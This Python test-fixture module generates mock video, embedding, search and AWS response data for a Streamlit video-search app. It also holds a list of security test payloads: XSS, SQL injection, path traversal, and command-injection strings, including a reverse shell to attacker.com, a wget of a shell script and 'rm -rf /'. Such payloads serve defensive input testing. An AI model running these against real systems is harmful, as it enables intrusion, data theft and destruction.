#!/usr/bin/env python3
"""
Test Fixtures and Mock Data Generators for Enhanced Streamlit Testing

Provides comprehensive test fixtures including:
- Mock video data generators
- Simulated embedding datasets
- Test video collections
- Mock AWS responses
- Sample search results
- Performance test datasets
- Security test payloads
"""

import numpy as np
import pandas as pd
import json
import time
import random
import string
import hashlib
from typing import Dict, List, Any, Optional, Tuple, Union
from dataclasses import dataclass, asdict
from pathlib import Path
import sys

# Add src to path for imports
sys.path.append(str(Path(__file__).parent.parent))

from frontend.unified_streamlit_app import ProcessedVideo


@dataclass
class MockVideoFile:
    """Mock video file for testing."""
    name: str
    size_bytes: int
    duration_sec: float
    resolution: Tuple[int, int]
    fps: float
    codec: str = "h264"
    has_audio: bool = True
    
    @property
    def size_mb(self) -> float:
        return self.size_bytes / (1024 * 1024)
    
    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


@dataclass
class MockEmbedding:
    """Mock embedding vector for testing."""
    vector_id: str
    embedding: np.ndarray
    metadata: Dict[str, Any]
    similarity_score: Optional[float] = None
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            'vector_id': self.vector_id,
            'embedding': self.embedding.tolist(),
            'metadata': self.metadata,
            'similarity_score': self.similarity_score
        }


@dataclass
class MockSearchResult:
    """Mock search result for testing."""
    vector_key: str
    video_name: str
    video_id: str
    segment_index: int
    start_sec: float
    end_sec: float
    similarity_score: float
    processing_type: str = "simulation"
    metadata: Optional[Dict[str, Any]] = None
    
    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


class TestDataGenerator:
    """Generates test data for various testing scenarios."""
    
    def __init__(self, seed: int = 42):
        """Initialize with random seed for reproducible test data."""
        self.rng = np.random.default_rng(seed)
        random.seed(seed)
        
    def generate_mock_video_file(
        self, 
        name_prefix: str = "test_video",
        duration_range: Tuple[float, float] = (30.0, 300.0),
        size_range: Tuple[int, int] = (10_000_000, 100_000_000)  # 10MB to 100MB
    ) -> MockVideoFile:
        """Generate a mock video file."""
        duration = self.rng.uniform(*duration_range)
        size_bytes = self.rng.integers(*size_range)
        
        # Common video resolutions
        resolutions = [(1920, 1080), (1280, 720), (854, 480), (640, 360)]
        resolution = resolutions[self.rng.integers(0, len(resolutions))]
        
        fps = self.rng.choice([24.0, 25.0, 30.0, 60.0])
        
        # Generate unique name
        timestamp = int(time.time() * 1000)
        unique_id = self.rng.integers(1000, 9999)
        name = f"{name_prefix}_{timestamp}_{unique_id}.mp4"
        
        return MockVideoFile(
            name=name,
            size_bytes=size_bytes,
            duration_sec=duration,
            resolution=resolution,
            fps=fps,
            has_audio=self.rng.random() > 0.1  # 90% have audio
        )
    
    def generate_processed_video(
        self,
        video_id: Optional[str] = None,
        processing_type: str = "simulation",
        segment_duration: float = 5.0
    ) -> ProcessedVideo:
        """Generate a processed video for testing."""
        if video_id is None:
            video_id = f"test-video-{self.rng.integers(10000, 99999)}"
        
        duration = self.rng.uniform(60.0, 600.0)  # 1-10 minutes
        segments = max(1, int(duration / segment_duration))
        
        # Generate metadata
        categories = ["action", "animation", "adventure", "sci-fi", "documentary", "music"]
        metadata = {
            "category": self.rng.choice(categories),
            "quality": self.rng.choice(["high", "medium", "low"]),
            "language": self.rng.choice(["en", "es", "fr", "de", "ja"]),
            "tags": list(self.rng.choice(["drama", "comedy", "thriller", "romance", "horror"], size=2))
        }
        
        s3_uri = None
        if processing_type == "real":
            bucket = f"test-bucket-{self.rng.integers(100, 999)}"
            key = f"videos/{video_id}.mp4"
            s3_uri = f"s3://{bucket}/{key}"
        
        return ProcessedVideo(
            video_id=video_id,
            name=f"{video_id}.mp4",
            segments=segments,
            duration=duration,
            s3_uri=s3_uri,
            processing_type=processing_type,
            metadata=metadata
        )
    
    def generate_embedding_vector(
        self,
        dimension: int = 1024,
        normalized: bool = True,
        vector_id: Optional[str] = None
    ) -> MockEmbedding:
        """Generate a mock embedding vector."""
        if vector_id is None:
            vector_id = f"emb-{self.rng.integers(100000, 999999)}"
        
        # Generate random embedding
        embedding = self.rng.normal(0, 1, size=dimension).astype(np.float32)
        
        if normalized:
            # Normalize to unit length
            norm = np.linalg.norm(embedding)
            if norm > 1e-8:
                embedding = embedding / norm
        
        # Generate metadata
        metadata = {
            "model": "marengo-2.7",
            "embedding_type": self.rng.choice(["visual-text", "visual-image", "audio"]),
            "quality_score": self.rng.uniform(0.7, 1.0),
            "processing_time_ms": self.rng.integers(100, 2000)
        }
        
        return MockEmbedding(
            vector_id=vector_id,
            embedding=embedding,
            metadata=metadata
        )
    
    def generate_search_results(
        self,
        query: str,
        num_results: int = 10,
        video_collection: Optional[Dict[str, ProcessedVideo]] = None,
        base_similarity: float = 0.9
    ) -> List[MockSearchResult]:
        """Generate mock search results."""
        if video_collection is None:
            # Generate default video collection
            video_collection = {}
            for i in range(5):
                video = self.generate_processed_video()
                video_collection[video.video_id] = video
        
        results = []
        videos = list(video_collection.values())
        
        # Generate deterministic seed from query
        query_seed = int(hashlib.sha256(query.encode()).hexdigest()[:8], 16)
        query_rng = np.random.default_rng(query_seed)
        
        for i in range(num_results):
            # Select random video
            video = query_rng.choice(videos)
            
            # Select random segment
            segment_idx = query_rng.integers(0, video.segments)
            start_sec = segment_idx * 5.0  # Assuming 5-second segments
            end_sec = start_sec + 5.0
            
            # Generate similarity score (decreasing with rank)
            similarity = base_similarity - (i * 0.02) + query_rng.uniform(-0.05, 0.05)
            similarity = max(0.0, min(1.0, similarity))
            
            # Generate vector key
            vector_key = f"{video.video_id}-segment-{segment_idx:04d}"
            
            result = MockSearchResult(
                vector_key=vector_key,
                video_name=video.name,
                video_id=video.video_id,
                segment_index=segment_idx,
                start_sec=start_sec,
                end_sec=end_sec,
                similarity_score=similarity,
                processing_type=video.processing_type,
                metadata={
                    "content_type": "video",
                    "segment_duration": end_sec - start_sec,
                    "video_category": video.metadata.get("category", "unknown")
                }
            )
            
            results.append(result)
        
        # Sort by similarity score (descending)
        results.sort(key=lambda x: x.similarity_score, reverse=True)
        
        return results
    
    def generate_large_video_collection(
        self,
        size: int = 100,
        processing_mix: Tuple[float, float] = (0.3, 0.7)  # (real, simulation)
    ) -> Dict[str, ProcessedVideo]:
        """Generate large video collection for performance testing."""
        collection = {}
        
        for i in range(size):
            # Determine processing type based on mix
            processing_type = "real" if self.rng.random() < processing_mix[0] else "simulation"
            
            video = self.generate_processed_video(
                video_id=f"perf-video-{i:04d}",
                processing_type=processing_type
            )
            
            collection[video.video_id] = video
        
        return collection
    
    def generate_embedding_dataset(
        self,
        size: int = 1000,
        dimension: int = 1024,
        clusters: int = 5
    ) -> List[MockEmbedding]:
        """Generate clustered embedding dataset for visualization testing."""
        embeddings = []
        
        # Generate cluster centers
        centers = []
        for _ in range(clusters):
            center = self.rng.normal(0, 2, size=dimension).astype(np.float32)
            center = center / np.linalg.norm(center)  # Normalize
            centers.append(center)
        
        # Generate embeddings around clusters
        for i in range(size):
            cluster_id = i % clusters
            center = centers[cluster_id]
            
            # Add noise around cluster center
            noise = self.rng.normal(0, 0.3, size=dimension).astype(np.float32)
            embedding_vector = center + noise
            
            # Normalize
            embedding_vector = embedding_vector / np.linalg.norm(embedding_vector)
            
            embedding = MockEmbedding(
                vector_id=f"cluster-{cluster_id}-emb-{i:06d}",
                embedding=embedding_vector,
                metadata={
                    "cluster_id": cluster_id,
                    "cluster_center_distance": float(np.linalg.norm(embedding_vector - center)),
                    "embedding_index": i
                }
            )
            
            embeddings.append(embedding)
        
        return embeddings


class SecurityTestPayloads:
    """Provides security test payloads and attack vectors."""
    
    @staticmethod
    def get_xss_payloads() -> List[str]:
        """Get XSS attack payloads."""
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "<input type='text' onfocus=alert('XSS') autofocus>",
            "\"><script>alert('XSS')</script>",
            "';alert('XSS');//",
            "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>"
        ]
    
    @staticmethod
    def get_sql_injection_payloads() -> List[str]:
        """Get SQL injection attack payloads."""
        return [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "' OR 1=1 --",
            "admin'--",
            "admin' OR '1'='1'/*",
            "') OR '1'='1' --",
            "1' UNION SELECT NULL,NULL,NULL --",
            "'; EXEC xp_cmdshell('dir') --",
            "' OR 'a'='a",
            "1'; WAITFOR DELAY '00:00:05' --"
        ]
    
    @staticmethod
    def get_path_traversal_payloads() -> List[str]:
        """Get path traversal attack payloads."""
        return [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "..//..//..//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252F..%252F..%252Fetc%252Fpasswd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            "../\x00/etc/passwd",
            "..\\..\\..\\boot.ini",
            "/var/www/../../../etc/passwd"
        ]
    
    @staticmethod
    def get_command_injection_payloads() -> List[str]:
        """Get command injection attack payloads."""
        return [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& curl malicious.com",
            "; whoami",
            "| nc -e /bin/sh attacker.com 4444",
            "; cat /etc/shadow",
            "&& wget http://malicious.com/shell.sh -O /tmp/shell.sh",
            "; python -c 'import os; os.system(\"rm -rf /\")'",
            "| python3 -c 'import subprocess; subprocess.call([\"curl\", \"http://malicious.com\"])'",
            "; bash -i >& /dev/tcp/attacker.com/8080 0>&1"
        ]
    
    @staticmethod
    def get_overflow_payloads() -> Dict[str, str]:
        """Get buffer overflow and DoS payloads."""
        return {
            "long_string": "A" * 10000,
            "very_long_string": "B" * 100000,
            "unicode_bomb": "💣" * 1000,
            "null_bytes": "test\x00" * 100,
            "control_chars": "".join(chr(i) for i in range(1, 32)) * 10,
            "nested_json": json.dumps({"a": {"b": {"c": {"d": "e"}}}} * 1000),
            "large_number": "9" * 1000,
            "negative_number": "-" + "9" * 1000
        }


class MockAWSResponses:
    """Provides mock AWS API responses for testing."""
    
    def __init__(self, seed: int = 42):
        self.rng = np.random.default_rng(seed)
    
    def get_s3_list_objects_response(
        self,
        bucket_name: str,
        prefix: str = "",
        max_keys: int = 1000
    ) -> Dict[str, Any]:
        """Generate mock S3 ListObjects response."""
        objects = []
        
        # Generate mock objects
        num_objects = min(max_keys, self.rng.integers(5, 50))
        
        for i in range(num_objects):
            key = f"{prefix}video-{i:04d}.mp4"
            size = self.rng.integers(10_000_000, 500_000_000)  # 10MB to 500MB
            last_modified = time.time() - self.rng.integers(0, 86400 * 30)  # Last 30 days
            
            objects.append({
                'Key': key,
                'Size': size,
                'LastModified': time.strftime('%Y-%m-%dT%H:%M:%S.000Z', time.gmtime(last_modified)),
                'ETag': f'"{hashlib.md5(key.encode()).hexdigest()}"',
                'StorageClass': 'STANDARD'
            })
        
        return {
            'IsTruncated': False,
            'Contents': objects,
            'Name': bucket_name,
            'Prefix': prefix,
            'MaxKeys': max_keys,
            'KeyCount': len(objects)
        }
    
    def get_s3_vector_search_response(
        self,
        query_vector: np.ndarray,
        top_k: int = 10
    ) -> Dict[str, Any]:
        """Generate mock S3 Vector search response."""
        results = []
        
        for i in range(top_k):
            # Generate mock vector and similarity
            result_vector = self.rng.normal(0, 1, size=len(query_vector)).astype(np.float32)
            result_vector = result_vector / np.linalg.norm(result_vector)
            
            # Calculate similarity (with some randomness)
            similarity = float(np.dot(query_vector, result_vector))
            similarity = max(0.0, similarity + self.rng.uniform(-0.1, 0.1))
            
            results.append({
                'VectorKey': f'vector-{i:04d}',
                'Similarity': similarity,
                'Metadata': {
                    'video_id': f'video-{i:04d}',
                    'segment_index': i % 20,
                    'start_time': (i % 20) * 5.0,
                    'end_time': ((i % 20) + 1) * 5.0,
                    'content_type': 'video'
                }
            })
        
        # Sort by similarity (descending)
        results.sort(key=lambda x: x['Similarity'], reverse=True)
        
        return {
            'Results': results,
            'QueryId': f'query-{int(time.time())}-{self.rng.integers(1000, 9999)}',
            'ResultCount': len(results)
        }
    
    def get_twelvelabs_processing_response(
        self,
        video_s3_uri: str,
        duration_sec: float = 120.0,
        segment_duration: float = 5.0
    ) -> Dict[str, Any]:
        """Generate mock TwelveLabs processing response."""
        segments = max(1, int(duration_sec / segment_duration))
        
        segment_results = []
        for i in range(segments):
            start_time = i * segment_duration
            end_time = min((i + 1) * segment_duration, duration_sec)
            
            segment_results.append({
                'segment_id': f'segment-{i:04d}',
                'start_time': start_time,
                'end_time': end_time,
                'embeddings': {
                    'visual_text': self.rng.normal(0, 1, size=1024).astype(np.float32).tolist(),
                    'visual_image': self.rng.normal(0, 1, size=1024).astype(np.float32).tolist(),
                    'audio': self.rng.normal(0, 1, size=1024).astype(np.float32).tolist()
                },
                'metadata': {
                    'quality_score': self.rng.uniform(0.8, 1.0),
                    'processing_time_ms': self.rng.integers(500, 2000),
                    'model_version': 'marengo-2.7'
                }
            })
        
        return {
            'task_id': f'task-{int(time.time())}-{self.rng.integers(10000, 99999)}',
            'status': 'completed',
            'video_uri': video_s3_uri,
            'duration_sec': duration_sec,
            'total_segments': segments,
            'segments': segment_results,
            'processing_time_sec': segments * 2.5,  # Assume ~2.5s per segment
            'model_info': {
                'name': 'marengo-2.7',
                'version': '2.7.0',
                'embedding_dimension': 1024
            }
        }


class PerformanceTestDatasets:
    """Provides datasets specifically for performance testing."""
    
    def __init__(self, seed: int = 42):
        self.rng = np.random.default_rng(seed)
    
    def create_scalability_test_sizes(self) -> List[Tuple[int, int]]:
        """Get test sizes for scalability testing."""
        return [
            (10, 128),      # Small
            (50, 256),      # Small-Medium
            (100, 512),     # Medium
            (500, 1024),    # Large
            (1000, 1024),   # X-Large
            (2000, 2048),   # XX-Large
            (5000, 4096)    # Stress test
        ]
    
    def create_memory_test_datasets(self) -> List[Dict[str, Any]]:
        """Create datasets for memory usage testing."""
        datasets = []
        
        # Various sizes and dimensions for memory profiling
        test_configs = [
            {"count": 100, "dim": 512, "description": "Small dataset"},
            {"count": 1000, "dim": 1024, "description": "Medium dataset"},
            {"count": 5000, "dim": 2048, "description": "Large dataset"},
            {"count": 10000, "dim": 1024, "description": "High count dataset"},
            {"count": 1000, "dim": 8192, "description": "High dimension dataset"}
        ]
        
        for config in test_configs:
            # Generate dataset
            embeddings = self.rng.normal(0, 1, size=(config["count"], config["dim"])).astype(np.float32)
            
            # Normalize embeddings
            norms = np.linalg.norm(embeddings, axis=1, keepdims=True)
            embeddings = embeddings / (norms + 1e-8)
            
            datasets.append({
                "embeddings": embeddings,
                "config": config,
                "memory_estimate_mb": (config["count"] * config["dim"] * 4) / (1024 * 1024)
            })
        
        return datasets
    
    def create_concurrent_test_scenarios(self) -> List[Dict[str, Any]]:
        """Create scenarios for concurrent testing."""
        return [
            {
                "name": "Light Concurrent Load",
                "thread_count": 2,
                "operations_per_thread": 10,
                "operation_type": "embedding_generation"
            },
            {
                "name": "Medium Concurrent Load", 
                "thread_count": 4,
                "operations_per_thread": 25,
                "operation_type": "search_simulation"
            },
            {
                "name": "Heavy Concurrent Load",
                "thread_count": 8,
                "operations_per_thread": 50,
                "operation_type": "mixed_operations"
            },
            {
                "name": "Stress Test",
                "thread_count": 16,
                "operations_per_thread": 100,
                "operation_type": "all_operations"
            }
        ]


def create_comprehensive_test_suite() -> Dict[str, Any]:
    """Create a comprehensive test suite with all fixtures and data."""
    generator = TestDataGenerator(seed=42)
    security = SecurityTestPayloads()
    aws_mocks = MockAWSResponses(seed=42)
    perf_datasets = PerformanceTestDatasets(seed=42)
    
    return {
        "video_files": {
            "small": [generator.generate_mock_video_file(duration_range=(30, 120)) for _ in range(5)],
            "medium": [generator.generate_mock_video_file(duration_range=(120, 600)) for _ in range(5)],
            "large": [generator.generate_mock_video_file(duration_range=(600, 3600)) for _ in range(3)]
        },
        
        "processed_videos": {
            "simulation": [generator.generate_processed_video(processing_type="simulation") for _ in range(20)],
            "real": [generator.generate_processed_video(processing_type="real") for _ in range(10)],
            "mixed": [generator.generate_processed_video(
                processing_type="real" if i % 3 == 0 else "simulation"
            ) for i in range(30)]
        },
        
        "embeddings": {
            "small_dataset": generator.generate_embedding_dataset(size=100, clusters=3),
            "medium_dataset": generator.generate_embedding_dataset(size=500, clusters=5),
            "large_dataset": generator.generate_embedding_dataset(size=2000, clusters=10),
            "high_dimensional": generator.generate_embedding_dataset(size=500, dimension=2048, clusters=5)
        },
        
        "search_results": {
            "text_to_video": generator.generate_search_results("find action scenes", num_results=15),
            "video_to_video": generator.generate_search_results("similar videos", num_results=10),
            "temporal_search": generator.generate_search_results("scenes between 30-60 seconds", num_results=8)
        },
        
        "security_payloads": {
            "xss": security.get_xss_payloads(),
            "sql_injection": security.get_sql_injection_payloads(),
            "path_traversal": security.get_path_traversal_payloads(),
            "command_injection": security.get_command_injection_payloads(),
            "overflow": security.get_overflow_payloads()
        },
        
        "aws_responses": {
            "s3_list": aws_mocks.get_s3_list_objects_response("test-bucket"),
            "vector_search": aws_mocks.get_s3_vector_search_response(
                np.random.randn(1024).astype(np.float32)
            ),
            "twelvelabs_processing": aws_mocks.get_twelvelabs_processing_response(
                "s3://test-bucket/video.mp4"
            )
        },
        
        "performance_datasets": {
            "scalability_sizes": perf_datasets.create_scalability_test_sizes(),
            "memory_datasets": perf_datasets.create_memory_test_datasets(),
            "concurrent_scenarios": perf_datasets.create_concurrent_test_scenarios()
        },
        
        "large_collections": {
            "small_collection": generator.generate_large_video_collection(size=50),
            "medium_collection": generator.generate_large_video_collection(size=200),
            "large_collection": generator.generate_large_video_collection(size=1000)
        }
    }


if __name__ == '__main__':
    # Generate and save comprehensive test suite
    print("🔧 Generating Comprehensive Test Fixtures...")
    
    test_suite = create_comprehensive_test_suite()
    
    # Display summary
    print("\n📊 Generated Test Fixtures Summary:")
    print(f"================================")
    
    for category, data in test_suite.items():
        if isinstance(data, dict):
            for subcategory, items in data.items():
                if isinstance(items, list):
                    print(f"{category}.{subcategory}: {len(items)} items")
                else:
                    print(f"{category}.{subcategory}: {type(items).__name__}")
        elif isinstance(data, list):
            print(f"{category}: {len(data)} items")
        else:
            print(f"{category}: {type(data).__name__}")
    
    # Save sample data for inspection
    sample_data = {
        "sample_video_file": test_suite["video_files"]["small"][0].to_dict(),
        "sample_processed_video": asdict(test_suite["processed_videos"]["simulation"][0]),
        "sample_search_result": test_suite["search_results"]["text_to_video"][0].to_dict(),
        "sample_embedding": test_suite["embeddings"]["small_dataset"][0].to_dict()
    }
    
    # Write sample data to file
    fixtures_dir = Path(__file__).parent / "fixtures"
    fixtures_dir.mkdir(exist_ok=True)
    
    with open(fixtures_dir / "sample_test_data.json", "w") as f:
        # Convert numpy arrays to lists for JSON serialization
        def json_serializer(obj):
            if isinstance(obj, np.ndarray):
                return obj.tolist()
            elif isinstance(obj, np.float32):
                return float(obj)
            elif isinstance(obj, np.int32):
                return int(obj)
            return str(obj)
        
        json.dump(sample_data, f, indent=2, default=json_serializer)
    
    print(f"\n✅ Test fixtures generated successfully!")
    print(f"📁 Sample data saved to: {fixtures_dir / 'sample_test_data.json'}")
    print(f"\n🎯 Use these fixtures in your test files by importing from test_fixtures.py")